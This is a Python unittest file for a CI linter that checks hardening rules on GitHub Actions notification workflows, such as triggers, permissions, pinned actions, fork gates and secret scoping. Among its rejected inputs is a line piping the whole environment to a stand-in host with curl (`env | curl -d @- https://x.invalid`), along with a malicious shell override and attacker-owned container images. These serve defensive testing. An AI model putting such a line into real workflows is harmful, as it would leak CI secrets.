#!/usr/bin/env python3
"""The test of desk_notify_check.py (spec S-001, Workflow 3, "Its own test").

The real two workflows pass, and the real gate admits exactly Workflow 3's cases. Each file under
fixtures/desk-notify/ is a copy of a real file with one fault and fails with that fault's named
reason, and nothing else. A few more made-up files cover the check's safer readings and the YAML
reader's refusals. desk-build runs it beside the check, with Python's own unittest:

  python3 .github/scripts/test_desk_notify_check.py
"""
import contextlib
import io
import re
import sys
import unittest
from pathlib import Path

sys.dont_write_bytecode = True
HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import desk_notify_check as check  # noqa: E402

WORKFLOWS = HERE.parent / "workflows"
FIXTURES = HERE / "fixtures" / "desk-notify"
NOTIFY = (WORKFLOWS / "desk-notify.yml").read_text(encoding="utf-8")
READY = (WORKFLOWS / "desk-notify-ready.yml").read_text(encoding="utf-8")

# Workflow 3's list, one fault each, and the reason each must fail with.
FIXTURE_REASONS = {
    "notify-pull-request-target.yml": "notify-trigger-pull_request_target",
    "notify-pull-request.yml": "notify-trigger-pull_request",
    "notify-contents-write.yml": "notify-permissions",
    "notify-no-environment.yml": "notify-environment",
    "notify-no-switch.yml": "notify-switch",
    "notify-no-origin-gate.yml": "notify-origin-gate",
    "notify-gate-any-workflow.yml": "notify-gate-admits-more",
    "notify-workflow-concurrency.yml": "notify-workflow-concurrency",
    "notify-persist-credentials-true.yml": "checkout-persist-credentials",
    "notify-checkout-head-sha.yml": "checkout-ref",
    "notify-pinned-by-tag.yml": "action-not-pinned",
    "notify-run-expression-line.yml": "run-expression",
    "notify-run-expression-block.yml": "run-expression",
    "ready-secret.yml": "ready-secret",
    "ready-checkout.yml": "ready-checkout",
    "ready-read-all.yml": "ready-permissions",
}


def quiet_main(argv):
    """check.main without its output: its `::error::` lines would show as annotations on desk-build's run."""
    with contextlib.redirect_stdout(io.StringIO()):
        return check.main(argv)


def codes(reasons):
    return sorted({code for code, _ in reasons})


def one(text, old, new):
    assert text.count(old) == 1, old
    return text.replace(old, new)


class RealFiles(unittest.TestCase):
    def test_the_real_files_pass(self):
        self.assertEqual(check.check_notify(NOTIFY), [])
        self.assertEqual(check.check_ready(READY), [])
        self.assertEqual(quiet_main([]), 0)

    def test_the_real_gate_admits_exactly_workflow_3s_cases(self):
        gate = check.read_yaml(NOTIFY)["jobs"]["notify"]["if"]
        tree = check.parse_expr(gate)
        admitted = 0
        for ctx in check.gate_contexts():
            got = check._truthy(check.evaluate(tree, ctx))
            self.assertEqual(got, check.reference_gate(ctx), ctx)
            admitted += got
        self.assertGreater(admitted, 0)

    def test_the_workflow_run_names_are_real_workflows(self):
        names = set()
        for path in WORKFLOWS.glob("*.yml"):
            m = re.search(r"^name:\s*(\S+)\s*$", path.read_text(encoding="utf-8"), re.MULTILINE)
            if m:
                names.add(m.group(1))
        listed = check.read_yaml(NOTIFY)["on"]["workflow_run"]["workflows"]
        self.assertEqual(set(listed), check.RUN_WORKFLOWS)
        self.assertLessEqual(set(listed), names)

    def test_the_sender_step_has_the_builders_env_names(self):
        steps = check.read_yaml(NOTIFY)["jobs"]["notify"]["steps"]
        send = [s for s in steps if check.SENDER in str(s.get("run"))]
        self.assertEqual(len(send), 1)
        self.assertEqual(set(send[0]["env"]), {
            "GITHUB_TOKEN", "DESK_NOTIFY_RUN_ID", "DESK_NOTIFY_TEST", "DESK_VAPID_PRIVATE_KEY",
            "DESK_VAPID_SUBJECT", "DESK_PUSH_SUBSCRIPTION", "DESK_NOTIFY_STATE_KEY", "DESK_BILLING_TOKEN"})


class Fixtures(unittest.TestCase):
    def test_the_fixtures_are_exactly_workflow_3s_list(self):
        self.assertEqual(sorted(p.name for p in FIXTURES.iterdir()), sorted(FIXTURE_REASONS))

    def test_each_fixture_fails_with_its_named_reason_only(self):
        for name, reason in FIXTURE_REASONS.items():
            with self.subTest(fixture=name):
                text = (FIXTURES / name).read_text(encoding="utf-8")
                fn = check.check_ready if name.startswith("ready-") else check.check_notify
                got = fn(text, name)
                self.assertEqual(codes(got), [reason], got)
                self.assertTrue(all(name in message for _, message in got), got)
                self.assertEqual(quiet_main([str(FIXTURES / name), str(WORKFLOWS / "desk-notify-ready.yml")]
                                            if fn is check.check_notify else
                                            [str(WORKFLOWS / "desk-notify.yml"), str(FIXTURES / name)]), 1)


class SaferReadings(unittest.TestCase):
    """Rules beyond Workflow 3's list, and readings of it, on made-up copies of the real files."""

    def notify_fails(self, text, reason):
        self.assertEqual(codes(check.check_notify(text)), [reason])

    def ready_fails(self, text, reason):
        self.assertEqual(codes(check.check_ready(text)), [reason])

    def test_another_trigger(self):
        self.notify_fails(one(NOTIFY, "  push:\n", "  issue_comment:\n  push:\n"), "notify-trigger-other")
        self.notify_fails(one(NOTIFY, "    branches: [main]\n", "    branches: [main, 'build/**']\n"),
                          "notify-trigger-other")
        self.notify_fails(one(NOTIFY, "    types: [completed, requested]\n", ""), "notify-trigger-other")
        self.notify_fails(one(NOTIFY, "desk-notify-ready]", "desk-notify-ready, scrub-proof]"),
                          "notify-trigger-other")

    def test_a_job_level_permissions_block(self):
        self.notify_fails(one(NOTIFY, "    environment: notify\n",
                              "    environment: notify\n    permissions: write-all\n"), "notify-permissions")

    def test_the_jobs_concurrency(self):
        self.notify_fails(one(NOTIFY, "      group: desk-notify\n      cancel-in-progress: false\n",
                              "      group: desk-notify\n      cancel-in-progress: true\n"), "notify-job-concurrency")
        self.notify_fails(one(NOTIFY, "    concurrency:\n      group: desk-notify\n      cancel-in-progress: false\n",
                              ""), "notify-job-concurrency")

    def test_a_second_job(self):
        self.notify_fails(NOTIFY + "  other:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: \"true\"\n",
                          "notify-jobs")

    def test_a_secret_outside_the_sending_step(self):
        self.notify_fails(one(NOTIFY, "          fetch-depth: 0\n",
                              "          fetch-depth: 0\n          token: ${{ secrets.DESK_BILLING_TOKEN }}\n"),
                          "notify-secret-outside-send-step")
        self.notify_fails(one(NOTIFY, "    timeout-minutes: 10\n",
                              "    timeout-minutes: 10\n    env:\n      K: ${{ secrets.DESK_NOTIFY_STATE_KEY }}\n"),
                          "notify-secret-outside-send-step")

    def test_downloading_an_artifact(self):
        self.notify_fails(one(NOTIFY, "      # The one step that sends",
                              "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0\n"
                              "      # The one step that sends"), "notify-action-not-allowed")

    def test_a_checkout_of_another_repository(self):
        self.notify_fails(one(NOTIFY, "          fetch-depth: 0\n",
                              "          fetch-depth: 0\n          repository: someone/Service-Desk\n"),
                          "checkout-repository")

    def test_a_checkout_without_persist_credentials(self):
        self.notify_fails(one(NOTIFY, "          persist-credentials: false\n", ""), "checkout-persist-credentials")

    def test_gates_the_check_cannot_read(self):
        for gate in ("contains(github.event.workflow_run.event, 'push')",
                     "${{ vars.DESK_NOTIFY_ON == 'true' }} && true",
                     "github.event.workflow_run.head_repository.fork == false",
                     "vars.DESK_NOTIFY_ON == 'true' && (github.event_name != 'workflow_run'"):
            with self.subTest(gate=gate):
                self.assertEqual(codes(check.check_gate(gate)), ["notify-gate-unreadable"])

    def test_gates_read_semantically(self):
        # A narrower gate passes: admitting no workflow_run run at all (Workflow 3's fallback).
        self.assertEqual(check.check_gate("vars.DESK_NOTIFY_ON == 'true' && github.event_name != 'workflow_run'"), [])
        # Any other narrower gate fails on its text: only the two exact forms pass.
        self.assertEqual(codes(check.check_gate("${{ false }}")), ["notify-gate-text"])
        # The whole expression in ${{ }} reads the same.
        gate = check.read_yaml(NOTIFY)["jobs"]["notify"]["if"]
        self.assertEqual(check.check_gate("${{ " + gate + " }}"), [])
        # A same-name fork is not this repository.
        self.assertEqual(codes(check.check_gate(
            "vars.DESK_NOTIFY_ON == 'true' && (github.event_name != 'workflow_run' || "
            "github.event.workflow_run.head_repository.name == github.event.repository.name)")),
            ["notify-gate-admits-more", "notify-origin-gate"])
        # No gate at all.
        self.assertEqual(codes(check.check_gate(None)),
                         ["notify-gate-admits-more", "notify-origin-gate", "notify-switch"])
        # requested admitted for every workflow, not only desk-deploy.
        self.assertEqual(codes(check.check_gate(gate.replace(
            "(github.event.action == 'completed' || github.event.workflow_run.name == 'desk-deploy')", "true"))),
            ["notify-gate-admits-more"])

    def test_the_reviewers_probe_gates(self):
        # Finding 1: a clause naming a value the evaluator does not try passed it; the text rule fails it.
        end = "github.event.workflow_run.path == '.github/workflows/asks-merge.yml'))))"
        for extra in ("github.event.workflow_run.head_repository.full_name == 'mallory/Service-Desk'",
                      "github.event.workflow_run.conclusion == 'failure'",
                      "github.event.workflow_run.head_branch == 'release'",
                      "github.event.workflow_run.head_repository.owner.login == 'mallory'"):
            with self.subTest(extra=extra):
                self.notify_fails(one(NOTIFY, end, end[:-1] + " ||\n      " + extra + ")"), "notify-gate-text")

    def test_the_gates_allowed_forms(self):
        gate = check.read_yaml(NOTIFY)["jobs"]["notify"]["if"]
        self.assertEqual(" ".join(gate.split()), check.GATE_FORMS[0])
        # Whitespace and line breaks do not matter; the fallback form passes in the file too.
        self.assertEqual(check.check_notify(one(NOTIFY, "      vars.DESK_NOTIFY_ON == 'true' &&\n",
                                                "      vars.DESK_NOTIFY_ON   ==   'true'\n      &&\n")), [])
        fallback = NOTIFY.replace(NOTIFY[NOTIFY.index("    if: >-\n"):NOTIFY.index("    runs-on:")],
                                  "    if: vars.DESK_NOTIFY_ON == 'true' && github.event_name != 'workflow_run'\n")
        self.assertEqual(check.check_notify(fallback), [])
        # A reordered but equivalent gate is not Workflow 3's text.
        self.notify_fails(one(NOTIFY, "github.event.workflow_run.event == 'push' ||\n      "
                                      "github.event.workflow_run.event == 'pull_request' ||",
                              "github.event.workflow_run.event == 'pull_request' ||\n      "
                              "github.event.workflow_run.event == 'push' ||"), "notify-gate-text")

    def test_the_upload_steps_if(self):
        up = "        if: hashFiles('desk-notify-state/state.json') != ''\n"
        self.notify_fails(one(NOTIFY, up, ""), "notify-upload-if")
        self.notify_fails(one(NOTIFY, up, "        if: always()\n"), "notify-upload-if")
        self.notify_fails(one(NOTIFY, up, "        if: hashFiles('desk-notify-state/state.json') != '' || always()\n"),
                          "notify-upload-if")

    def test_the_send_steps_run(self):
        send = "        run: node src/notify/run.mjs --project Service-Desk\n"
        for new in ("        run: node src/notify/run.mjs --project Service-Desk; env | curl -d @- https://x.invalid\n",
                    "        run: node src/notify/run.mjs --project Service-Desk && echo done\n",
                    "        run: |\n          node src/notify/run.mjs --project Service-Desk\n          echo done\n",
                    "        run: node src/notify/run.mjs --project Personal-Org-Operating-Model\n"):
            with self.subTest(new=new):
                self.notify_fails(one(NOTIFY, send, new), "notify-send-run")
        # The same command as a block passes; a second run: step fails.
        self.assertEqual(check.check_notify(one(NOTIFY, send, "        run: |\n          node src/notify/run.mjs --project Service-Desk\n")), [])
        self.notify_fails(one(NOTIFY, "      # The one step that sends", "      - run: echo hello\n      # The one step that sends"),
                          "notify-send-run")

    def test_no_container_and_no_shell_override(self):
        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04\n    container: mallory/image:latest\n"),
                          "notify-container")
        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
                              "    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: mallory/db\n"),
                          "notify-container")
        self.notify_fails(one(NOTIFY, "        run: node src/notify/run.mjs --project Service-Desk\n",
                              "        shell: bash -c 'curl x' {0}\n        run: node src/notify/run.mjs --project Service-Desk\n"),
                          "notify-shell")
        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
                              "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: python {0}\n"),
                          "notify-shell")
        self.notify_fails(one(NOTIFY, "\njobs:\n", "\ndefaults:\n  run:\n    shell: sh {0}\n\njobs:\n"), "notify-shell")

    def test_no_event_values_in_workflow_or_job_env(self):
        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
                              "    env:\n      BR: ${{ github.event.workflow_run.head_branch }}\n    runs-on: ubuntu-24.04\n"),
                          "notify-event-env")
        self.notify_fails(one(NOTIFY, "\njobs:\n", "\nenv:\n  T: ${{ inputs.test }}\n\njobs:\n"), "notify-event-env")
        self.notify_fails(one(NOTIFY, "\njobs:\n", "\nenv:\n  T: ${{ toJSON(github.event) }}\n\njobs:\n"),
                          "notify-event-env")
        # A plain value there is no fault.
        self.assertEqual(check.check_notify(one(NOTIFY, "\njobs:\n", "\nenv:\n  LANG: C.UTF-8\n\njobs:\n")), [])

    def test_the_ready_workflow(self):
        self.ready_fails(one(READY, "    timeout-minutes: 5\n", "    timeout-minutes: 5\n    environment: notify\n"),
                         "ready-environment")
        self.ready_fails(one(READY, "  pull_request:\n", "  pull_request_target:\n"), "ready-trigger")
        self.ready_fails(one(READY, "permissions: {}\n", ""), "ready-permissions")
        self.ready_fails(one(READY, "    timeout-minutes: 5\n", "    timeout-minutes: 5\n    permissions: write-all\n"),
                         "ready-permissions")
        self.ready_fails(one(READY, '        run: "true"\n', "        run: echo ${{ github.head_ref }}\n"),
                         "run-expression")

    def test_yaml_the_reader_refuses(self):
        for old, new in (("permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n"),
                         ("    runs-on: ubuntu-24.04\n", "    runs-on: !!str ubuntu-24.04\n"),
                         ("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    timeout-minutes: 11\n"),
                         ("        run: node src/notify/run.mjs --project Service-Desk\n",
                          "        run: node src/notify/run.mjs\n          --project Service-Desk\n"),
                         ("name: desk-notify\n", "name: desk-notify\n---\nname: other\n")):
            with self.subTest(new=new):
                self.assertEqual(codes(check.check_notify(one(NOTIFY, old, new))), ["yaml-unreadable"])

    def test_the_reader(self):
        self.assertEqual(check.read_yaml(
            "a:\n  - x: '1'\n    y: \"it's\"\n  - [b, 'c d', {e: f}]\n  -\n    - g\nh: |\n  one\n    two\n\ni: >-\n  p\n  q\n"
            "j: {}\nk: true # c\nl: a #b\n"),
            {"a": [{"x": "1", "y": "it's"}, ["b", "c d", {"e": "f"}], ["g"]], "h": "one\n  two\n",
             "i": "p q", "j": {}, "k": True, "l": "a"})


if __name__ == "__main__":
    unittest.main(verbosity=1)
